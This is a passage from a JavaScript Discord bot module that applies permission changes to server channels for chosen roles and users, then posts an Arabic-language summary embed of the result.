    const workers = [];
    for (let i = 0; i < Math.min(CONCURRENCY_LIMIT, tasks.length); i++) {
      workers.push(worker());
    }
    await Promise.all(workers);
    // Prepare a summary message
    const rolesMention = (session.roles || []).map(id => `<@&${id}>`).join(', ');
    const usersMention = (session.users || []).map(id => `<@${id}>`).join(', ');
    const targetsMention = [rolesMention, usersMention].filter(Boolean).join(' , ');
    const permsList = session.selectedPermissions.map(p => `• ${formatPermissionLabel(p)}`).join('\n');
    const channelCount = updatedChannels;
    const excludedCount = session.excludedChannels ? session.excludedChannels.length : 0;
    const actionFieldName = session.action === 'reset'
      ? '**نوع العملية**'
      : (session.action === 'remove' ? '**الصلاحيات المزالة**' : '**الصلاحيات المضافة**');
    const summaryEmbed = colorManager.createEmbed()
      .setTitle('تم تطبيق الصلاحيات')
      .setDescription(`**تم تحديث صلاحيات ${targetsMention || 'العناصر المحددة'} بنجاح**`)
      .addFields(
        { name: actionFieldName, value: session.action === 'reset' ? 'إعادة تعيين (حذف Overwrite بالكامل)' : (permsList || '—'), inline: false },
        { name: '**عدد الرومات المعدلة**', value: `${channelCount}`, inline: true },
        { name: '**عدد الرومات المستثناة**', value: `${excludedCount}`, inline: true },
        { name: '**أخطاء أثناء التحديث**', value: `${errors}`, inline: true }
      )
      .setThumbnail('https://cdn.discordapp.com/attachments/1373799493111386243/1400645490118234132/download__8_-removebg-preview.png?ex=688d6443&is=688c12c3&hm=217945651e6a5f649ede7719b4572da60d009a8aa461a507b72e2f82ea59a4cd&');
    // Update the original message with the summary.  This replaces the previous
    // embed and removes interactive components.  Avoid using a hidden
    // follow-up message so the result is visible to all users.
    // Update the original message with the summary.  Using message.edit avoids
    // sending a separate hidden message or reply.
    await interaction.message.edit({ embeds: [summaryEmbed], components: [] });
  } catch (error) {
    console.error('Error applying permissions:', error);
    try {
      await interaction.message.edit({ content: '❌ **حدث خطأ أثناء تطبيق الصلاحيات!**', embeds: [], components: [] });
    } catch (_) {
      // ignore
    }
  }
}

module.exports = { name, execute, handleInteraction };
